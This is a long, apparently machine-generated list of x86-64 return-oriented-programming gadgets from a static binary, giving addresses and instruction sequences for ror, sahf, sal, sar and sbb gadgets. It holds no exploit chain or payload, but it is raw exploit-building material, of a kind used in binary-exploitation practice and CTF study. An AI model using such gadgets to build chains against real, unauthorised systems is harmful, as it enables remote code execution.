0x00000000004155dc : rol ebx, 0x66 ; nop ; xor eax, eax ; ret
0x00000000004155db : rol r11d, 0x66 ; nop ; xor eax, eax ; ret
0x000000000045eb75 : ror byte ptr [r9 + rcx*4 - 1], 0x41 ; call rsp
0x0000000000474cd8 : ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x000000000041d752 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x41d799 ; add rax, rdi ; ret
0x0000000000432e57 : ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x0000000000460d9c : ror byte ptr [rax + 0x29], 1 ; clc ; shr rax, 2 ; ret
0x0000000000408f6e : ror byte ptr [rax + 0x29], 1 ; ret
0x0000000000461fcc : ror byte ptr [rax + 0x39], 0xd7 ; ja 0x461fff ; ret
0x000000000043d9a8 : ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x000000000046839a : ror byte ptr [rax + 0x39], cl ; ret
0x000000000045d063 : ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000040f80c : ror byte ptr [rax + 0x48417411], cl ; mov dword ptr [rsi], ecx ; ret
0x000000000043effd : ror byte ptr [rax + 0x63], cl ; test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x000000000044dadb : ror byte ptr [rax + 0xf], 0x44 ; ret 0xe2e9
0x00000000004044a4 : ror byte ptr [rax + 0xf], 0x44 ; shr cl, 1 ; ret
0x000000000044a259 : ror byte ptr [rax + 0xf], 1 ; ret 0x3949
0x000000000044a24a : ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x000000000041d7fc : ror byte ptr [rax + 1], 0xf8 ; add rax, rcx ; ret
0x000000000041d722 : ror byte ptr [rax + 1], 0xf8 ; ret
0x000000000041dc13 : ror byte ptr [rax + 1], 0xf8 ; vzeroupper ; ret
0x000000000040515b : ror byte ptr [rax + 1], 1 ; ret
0x0000000000432e54 : ror byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x0000000000487508 : ror byte ptr [rax + rax], 0 ; ret
0x000000000041dea5 : ror byte ptr [rax - 0x2d], 0xfa ; movzx edx, dl ; sub eax, edx ; ret
0x0000000000457644 : ror byte ptr [rax - 0x3f], 0xf8 ; add al, byte ptr [rcx + 0x29] ; ret
0x000000000045761d : ror byte ptr [rax - 0x3f], 0xf8 ; add cl, byte ptr [rax + 0x29] ; ret
0x000000000043de78 : ror byte ptr [rax - 0x73], 0x3c ; ret
0x000000000041d712 : ror byte ptr [rax - 0x73], 0x44 ; cmp al, dh ; ret
0x000000000041d742 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], ah ; ret
0x000000000041d732 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], dl ; ret
0x000000000041560e : ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x00000000004091b0 : ror byte ptr [rax - 0x77], 1 ; ret
0x0000000000474ced : ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x0000000000449c04 : ror byte ptr [rax - 0x77], 1 ; ret 0x894c
0x000000000040b8e0 : ror byte ptr [rax - 0x77], 1 ; ret 0x8b48
0x000000000046d3d2 : ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000040624d : ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x0000000000414465 : ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000046f7cc : ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x000000000040d3c5 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000461ec3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x000000000040caa1 : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x0000000000413606 : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2ca7e25
0x0000000000468328 : ror byte ptr [rax - 0x7d], 1 ; ret
0x00000000004070d0 : ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x0000000000473d4d : ror byte ptr [rax], 0x83 ; ret 0x3901
0x000000000046076c : ror byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x20 ; call rbx
0x0000000000454d2a : ror byte ptr [rbp - 0x7b], cl ; inc dword ptr [rcx + 0xf] ; xchg eax, esp ; ret 0x76e9
0x0000000000447b49 : ror byte ptr [rcx + 0x1e3d8bc5], cl ; ret
0x00000000004763b7 : ror byte ptr [rcx + 0x63], 4 ; test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x0000000000414daa : ror byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, r15 ; call 0x411059
0x000000000046a2a3 : ror byte ptr [rcx + rcx*4 - 0x40], 0x5b ; ret
0x000000000045eb76 : ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x00000000004412ff : ror byte ptr [rcx - 0x7d], cl ; cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000045cec4 : ror byte ptr [rcx - 9], cl ; cmc ; mov rbp, rax ; jmp 0x45ce97
0x00000000004430ac : ror byte ptr [rdi + rcx + 0x49], cl ; ret 0xc149
0x000000000043d89c : ror byte ptr [rdi], 0x44 ; ret 0x66c3
0x0000000000458487 : ror byte ptr [rdi], 0x82 ; ret 0xffe7
0x00000000004660c0 : ror byte ptr [rdi], 0x84 ; cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0x83480000 ; ret
0x00000000004743b8 : ror byte ptr [rdi], 0x84 ; leave ; add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00000000004082ed : ror byte ptr [rdi], 0x84 ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000462119 : ror byte ptr [rdi], 0x84 ; nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000407a61 : ror byte ptr [rdi], 0x84 ; popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000045521b : ror byte ptr [rdi], 0x84 ; ret 5
0x0000000000414639 : ror byte ptr [rdi], 0x85 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000043338a : ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00000000004333c6 : ror byte ptr [rdi], 0x85 ; ret
0x000000000045a807 : ror byte ptr [rdi], 0x85 ; ret 0xffe8
0x000000000043e3ff : ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x000000000043d6d8 : ror byte ptr [rdi], 0x92 ; ret 0xd029
0x000000000046ca71 : ror byte ptr [rdi], 0x94 ; ret 0x3d
0x000000000046f7cf : ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000438efe : ror byte ptr [rdi], 0x94 ; ret 0xc085
0x00000000004081a0 : ror byte ptr [rdi], 0x95 ; ret 0xdaf7
0x000000000041560b : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x000000000040c06e : ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; ret
0x0000000000439375 : ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x0000000000406262 : ror byte ptr [rdi], 1 ; mov dh, 0x17 ; test dl, dl ; jne 0x40624c ; ret
0x0000000000444273 : ror byte ptr [rdi], cl ; mov ch, ah ; add al, byte ptr [rax] ; add bh, dh ; ret 0xf800
0x000000000046fdce : ror dword ptr [rax + 1], 0xf8 ; sub rax, r8 ; ret
0x0000000000438f08 : ror dword ptr [rax + 1], 0xf8 ; sub rax, rsi ; ret
0x000000000040b7fc : ror dword ptr [rax - 0x39], cl ; ret 0x2c20
0x0000000000474eb4 : ror dword ptr [rax - 0x3f], cl ; out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x000000000045c81e : ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x000000000046e37b : ror dword ptr [rax - 0x77], 0x34 ; ret 0x8348
0x0000000000453f60 : ror dword ptr [rax - 0x77], 1 ; ret 0x27e9
0x0000000000465bda : ror dword ptr [rax - 0x77], 1 ; ret 0xd348
0x00000000004703d1 : ror dword ptr [rax - 0x77], cl ; ret
0x000000000040d2dd : ror dword ptr [rax - 0x7b], 0xd2 ; jne 0x40d2d7 ; ret
0x000000000045dabd : ror dword ptr [rax - 0x7b], 0xd2 ; jne 0x45dab7 ; ret
0x000000000044c164 : ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x000000000045391b : ror dword ptr [rcx - 0x77], 0x14 ; ret
0x0000000000436eb7 : ror dword ptr [rcx], cl ; ret 0xe074
0x000000000041f188 : ror dword ptr [rdi], 0x85 ; adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f894 : ror dword ptr [rdi], 0x85 ; add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f666 : ror dword ptr [rdi], 0x85 ; add eax, 0xc0310000 ; ret
0x000000000041f5e6 : ror dword ptr [rdi], 0x85 ; cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x000000000041f924 : ror dword ptr [rdi], 0x85 ; je 0x41f934 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f41b : ror dword ptr [rdi], 0x85 ; jno 0x41f430 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f4e3 : ror dword ptr [rdi], 0x85 ; mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f160 : ror dword ptr [rdi], 0x85 ; sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043a79a : ror dword ptr [rdi], 0xaf ; ret 0xffe9
0x000000000046d889 : ror ebx, cl ; std ; inc dword ptr [rbp - 0x76b08a40] ; ret
0x000000000040d2dc : ror qword ptr [r8 - 0x7b], 0xd2 ; jne 0x40d2d8 ; ret
0x000000000045dabc : ror qword ptr [r8 - 0x7b], 0xd2 ; jne 0x45dab8 ; ret
0x000000000047d099 : sahf ; cli ; call rdx
0x000000000047d015 : sahf ; cli ; inc dword ptr [rax - 0x62] ; cli ; jmp rsi
0x000000000047d0d5 : sahf ; cli ; jmp qword ptr [rdx]
0x000000000047d019 : sahf ; cli ; jmp rsi
0x000000000047d095 : sahf ; cli ; ljmp [rsi + rbx*4] ; cli ; call rdx
0x0000000000431a4e : sahf ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000048f8a5 : sahf ; ret 0x38ae
0x0000000000476aa4 : sahf ; ret 0xf45
0x000000000047aad7 : sahf ; stc ; push rbx ; ret
0x000000000040c071 : sal bh, 0xd8 ; pop rbx ; ret
0x000000000040ee5e : sal bh, 0xd8 ; ret
0x0000000000417f47 : sal bh, 1 ; ret 0x8000
0x0000000000417e07 : sal bh, 1 ; ret 0xc000
0x0000000000417cc7 : sal bh, 1 ; ret 0xe000
0x0000000000417b87 : sal bh, 1 ; ret 0xf000
0x0000000000417a47 : sal bh, 1 ; ret 0xf800
0x0000000000417907 : sal bh, 1 ; ret 0xfc00
0x00000000004177c7 : sal bh, 1 ; ret 0xfe00
0x0000000000417687 : sal bh, 1 ; ret 0xff00
0x0000000000417547 : sal bh, 1 ; ret 0xff80
0x0000000000417407 : sal bh, 1 ; ret 0xffc0
0x00000000004172c7 : sal bh, 1 ; ret 0xffe0
0x0000000000417187 : sal bh, 1 ; ret 0xfff0
0x0000000000417047 : sal bh, 1 ; ret 0xfff8
0x0000000000416f07 : sal bh, 1 ; ret 0xfffc
0x0000000000416dc7 : sal bh, 1 ; ret 0xfffe
0x0000000000460e7f : sal bl, 1 ; ret
0x000000000046ae7d : sal bl, cl ; ret
0x000000000040618d : sal byte ptr [rax + 0x48], 0xc7 ; ret 0xfff0
0x000000000047a79c : sal byte ptr [rax + 0x48ffffff], 0xc7 ; ret 0xf480
0x00000000004422dd : sal byte ptr [rax + rsi + 0x48], 0x83 ; ret
0x000000000047d7c0 : sal byte ptr [rax], 1 ; sti ; push qword ptr [rax + 0x32] ; sti ; call qword ptr [rax]
0x0000000000460332 : sal byte ptr [rbp + 0x2b], 0x4c ; mov eax, eax ; vzeroupper ; ret
0x000000000046d88e : sal byte ptr [rbp + 0x4f], 0x89 ; ret
0x000000000040551b : sal byte ptr [rbp + 0xa], 0x5b ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000479853 : sal byte ptr [rbp + 0xa], 0xf3 ; ret
0x000000000040c052 : sal byte ptr [rbp + 0xb], cl ; xor eax, eax ; ret
0x00000000004676e4 : sal byte ptr [rbp + 2], 0x5b ; ret
0x000000000040fcea : sal byte ptr [rbp + 2], 1 ; ret
0x000000000047aaea : sal byte ptr [rbp + 3], cl ; ret
0x0000000000479838 : sal byte ptr [rbp + 5], 0xf3 ; ret
0x00000000004009f8 : sal byte ptr [rbp + rcx + 0x5d], 0xbf ; shr byte ptr [rbx], 1 ; push 0 ; jmp rax
0x0000000000447016 : sal byte ptr [rbp + rcx*4 - 0x7b], 1 ; sal byte ptr [rcx + rcx*4 + 0x41], 0x89 ; ret 0x8ce9
0x0000000000443a76 : sal byte ptr [rbp + rdx*4 - 0x7b], 1 ; sal byte ptr [rcx + rdx*4 + 0x41], 0x89 ; ret 0x3ce9
0x00000000004461c6 : sal byte ptr [rbp + rdx*4 - 0x7b], 1 ; sal byte ptr [rcx + rdx*4 + 0x41], 0x89 ; ret 0x8ce9
0x000000000040dcfd : sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x0000000000438bf0 : sal byte ptr [rbp - 0x13], cl ; lea rax, [rcx - 1] ; ret
0x000000000040d2e0 : sal byte ptr [rbp - 0x13], cl ; ret
0x000000000041826b : sal byte ptr [rbp - 0x1e], 0x31 ; shr byte ptr [rcx], 0xc8 ; ret
0x0000000000406267 : sal byte ptr [rbp - 0x27], cl ; ret
0x000000000041dc4d : sal byte ptr [rbp - 0x30], 0xc5 ; std ; xlatb ; ret
0x000000000041dc45 : sal byte ptr [rbp - 0x38], 0xc5 ; std ; xlatb ; ret 0xc085
0x0000000000432a9d : sal byte ptr [rbp - 0x50], 0xc5 ; std ; xlatb ; ret
0x0000000000432a95 : sal byte ptr [rbp - 0x68], 0xc5 ; std ; xlatb ; ret 0xc085
0x0000000000460bdb : sal byte ptr [rbp - 0xe], cl ; ret
0x000000000043d9d0 : sal byte ptr [rbp - 0xf], 0x5a ; pop r10 ; ret
0x000000000040ee1c : sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x000000000043e9be : sal byte ptr [rbx + rbp + 0x48], 0x8b ; push rax ; or dh, dh ; ret 0x8902
0x000000000043adea : sal byte ptr [rbx + rcx + 0x48], cl ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400a3a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; shr byte ptr [rbx], 1 ; push 0 ; jmp rax
0x00000000004643d9 : sal byte ptr [rbx + rcx + 0xf], 0x1f ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000471b9f : sal byte ptr [rbx + rdi + 0x48], cl ; shl edx, 5 ; add rdx, rax ; jmp 0x471bbd
0x000000000047404d : sal byte ptr [rbx - 0x7d], 0xe8 ; add dword ptr [rbp + rcx*4 + 0x74], ecx ; ret
0x000000000044701a : sal byte ptr [rcx + rcx*4 + 0x41], 0x89 ; ret 0x8ce9
0x0000000000432d9c : sal byte ptr [rcx + rdx + 0x48], cl ; bsf eax, edx ; ret
0x0000000000443a7a : sal byte ptr [rcx + rdx*4 + 0x41], 0x89 ; ret 0x3ce9
0x00000000004461ca : sal byte ptr [rcx + rdx*4 + 0x41], 0x89 ; ret 0x8ce9
0x00000000004402a2 : sal byte ptr [rcx], 0xd2 ; add eax, 1 ; push rax ; call rbx
0x000000000043d9a6 : sal byte ptr [rcx], 1 ; ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x0000000000462566 : sal byte ptr [rdi + 0x48], 0x89 ; ret
0x000000000046003b : sal byte ptr [rdx + 0x48], cl ; bsf eax, edx ; ret
0x000000000040040d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000043e1db : sal byte ptr [rdx + rcx + 0x48], cl ; lea edi, [rcx + rax + 0x20] ; jmp rdx
0x00000000004330b3 : sal byte ptr [rdx + rdx + 0x48], 0xff ; ret 0x2288
0x000000000046fb91 : sal byte ptr [rsp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x000000000046b3f9 : sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x00000000004421c1 : sal dword ptr [rdi + rdx + 0xf], 0x1f ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004392d3 : sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000049684d : sal edi, 1 ; call qword ptr [rdx]
0x0000000000496861 : sal edi, 1 ; jmp rcx
0x0000000000402974 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret
0x000000000043b6a3 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x000000000046b783 : sar bh, 0xff ; lcall [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x000000000046f1e0 : sar bh, 0xff ; mov eax, 1 ; ret
0x0000000000499460 : sar bl, 1 ; cli ; call rsp
0x000000000047a7c5 : sar byte ptr [rax + 0x48ffffff], 0xc7 ; ret 0xf640
0x0000000000467781 : sar byte ptr [rax + 0xe], 0x5b ; ret
0x0000000000438eae : sar byte ptr [rcx], 0xc8 ; jle 0x438ef0 ; movsxd rax, ecx ; ret
0x000000000043eecd : sar byte ptr [rcx], cl ; ret
0x0000000000448646 : sar byte ptr [rdx], 0xf ; ret 0xc083
0x000000000047d7e8 : sar byte ptr [rdx], 1 ; sti ; jmp qword ptr [rax]
0x000000000049023f : sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x000000000047d7f4 : sar byte ptr [rsi], 0xfb ; call qword ptr [rax]
0x000000000047d3c9 : sar dl, 1 ; call rdx
0x000000000047d3c5 : sar dl, 1 ; inc dword ptr [rdx - 0x30] ; cli ; call rdx
0x000000000047d349 : sar dl, 1 ; jmp rsi
0x000000000047d3b9 : sar dl, cl ; call qword ptr [rdx + 0x22fffad1]
0x000000000047d335 : sar dl, cl ; call qword ptr [rsi]
0x000000000047d2f5 : sar dl, cl ; jmp qword ptr [rax]
0x000000000042a813 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x42a81e ; ret
0x000000000044b1eb : sar dword ptr [rdx + 0x3190fffb], 0xc0 ; ret
0x00000000004397e9 : sar dword ptr [rsi + 0x7f], 0x23 ; vzeroupper ; ret
0x000000000045e62c : sar eax, 2 ; lea eax, [r8 - 1] ; ret
0x0000000000472f27 : sar eax, 3 ; pop rbp ; pop r12 ; ret
0x000000000048ffa3 : sar ecx, 1 ; jnp 0x48ff64 ; ret
0x00000000004630f5 : sar ecx, cl ; dec dword ptr [rax + 0x39] ; ret
0x000000000047d301 : sar edx, 1 ; call rax
0x000000000047d2fd : sar edx, 1 ; inc dword ptr [rax - 0x2f] ; cli ; call rax
0x000000000047d3bd : sar edx, 1 ; jmp qword ptr [rdx]
0x000000000047d281 : sar edx, 1 ; jmp rsp
0x000000000045e6d2 : sar edx, 2 ; sub eax, edx ; ret
0x000000000047d2f1 : sar edx, cl ; call qword ptr [rax + 0x20fffad2]
0x000000000047d3ad : sar edx, cl ; jmp rdx
0x000000000041dea7 : sar edx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x0000000000439ca3 : sar esi, 1 ; jg 0x439cd3 ; vzeroupper ; ret
0x0000000000439e3c : sar esi, 1 ; jg 0x439e6c ; vzeroupper ; ret
0x000000000045e62b : sar r8, 2 ; lea eax, [r8 - 1] ; ret
0x0000000000472f26 : sar rax, 3 ; pop rbp ; pop r12 ; ret
0x000000000045e6d1 : sar rdx, 2 ; sub eax, edx ; ret
0x000000000041dea6 : sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x0000000000451751 : sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x0000000000496c58 : sbb al, 0x2d ; add byte ptr [rax], al ; je 0x496c4c ; idiv edi ; ret 2
0x000000000046d437 : sbb al, 0x48 ; add esp, 0x48 ; ret
0x000000000048c41c : sbb al, 0xfd ; cld ; call rsp
0x000000000048c3c0 : sbb al, 0xfd ; cld ; jmp rsp
0x00000000004939dd : sbb al, 0xfe ; call rsp
0x000000000046f727 : sbb al, ch ; ret
0x0000000000499919 : sbb bl, bh ; call qword ptr [rax]
0x0000000000499901 : sbb bl, bh ; call qword ptr [rbx]
0x000000000049992d : sbb bl, bh ; call qword ptr [rdx]
0x000000000047d789 : sbb bl, bh ; call rax
0x000000000048ed25 : sbb bl, byte ptr [rsi] ; ret
0x0000000000416278 : sbb bl, ch ; ret
0x000000000046d234 : sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x000000000046f7c9 : sbb byte ptr [r9], sil ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000469cd9 : sbb byte ptr [rax + 0x29], cl ; ret 0x394c
0x000000000040fa11 : sbb byte ptr [rax + 0x39], cl ; ret
0x000000000044c2b4 : sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000046d235 : sbb byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x000000000044a909 : sbb byte ptr [rax + 1], cl ; ret
0x0000000000456b82 : sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x00000000004780aa : sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x000000000046d897 : sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x0000000000460ab0 : sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x000000000046b41c : sbb byte ptr [rax - 0x77], cl ; push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000043dc0d : sbb byte ptr [rax - 0x77], cl ; push rdi ; and dh, al ; sub byte ptr [r9], r8b ; ret
0x000000000040d341 : sbb byte ptr [rax - 0x77], cl ; push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000414435 : sbb byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000047039f : sbb byte ptr [rax - 0x77], cl ; ret
0x0000000000457289 : sbb byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000499588 : sbb byte ptr [rax], cl ; sti ; call qword ptr [rdx]
0x0000000000414478 : sbb byte ptr [rbx + 0x5d], bl ; jmp rax
0x000000000043ed2c : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00000000004096e7 : sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000040ea17 : sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000045e0ca : sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x0000000000410bce : sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x000000000045e89e : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x000000000041558a : sbb byte ptr [rcx], cl ; ret 0xbe9
0x0000000000414463 : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000046f7ca : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000473366 : sbb byte ptr [rdi], cl ; test bl, dl ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000415e6d : sbb cl, byte ptr [rcx + rcx*4 - 0x30] ; pop rbx ; ret
0x0000000000403774 : sbb cl, byte ptr [rcx - 0x7d] ; ret
0x0000000000447dfd : sbb cl, byte ptr [rdi] ; mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x000000000043019d : sbb cl, byte ptr [rdi] ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431dea : sbb cl, byte ptr [rdi] ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x000000000043160a : sbb cl, byte ptr [rdi] ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00000000004319fa : sbb cl, byte ptr [rdi] ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043121a : sbb cl, byte ptr [rdi] ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430cfd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004304dd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000042fcbd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x00000000004313b9 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043081d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042fffd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042f7dd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00000000004309bd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x00000000004318aa : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004310ca : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004321da : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042fb1d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042fc53 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430953 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430473 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004317ab : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004320db : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430c93 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ff93 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x000000000042fab3 : sbb cl, byte ptr [rdi] ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004307b3 : sbb cl, byte ptr [rdi] ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00000000004318fb : sbb cl, byte ptr [rdi] ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043111b : sbb cl, byte ptr [rdi] ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004939ad : sbb dh, bh ; call qword ptr [rax]
0x00000000004783d5 : sbb dh, bl ; ret
0x000000000046c307 : sbb dl, dh ; jmp r11
0x0000000000472f05 : sbb dword ptr [rax - 0x7d], ecx ; ret
0x00000000004782c9 : sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x000000000043e059 : sbb dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x0000000000495841 : sbb dword ptr [rax], eax ; add ah, ch ; ja 0x495844 ; call qword ptr [rdx]
0x0000000000459a1f : sbb dword ptr [rbx - 0x51f43], eax ; call qword ptr [rax]
0x00000000004915dd : sbb dword ptr [rbx], edx ; mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x000000000045291e : sbb dword ptr [rdx + rdx*8 - 0x7cb6c28c], eax ; ret 0xf01
0x00000000004388c7 : sbb eax, -1 ; ret
0x0000000000477422 : sbb eax, 0x18c48348 ; ret
0x000000000047a440 : sbb eax, 0x2298ab ; jne 0x47a430 ; pop rbx ; ret
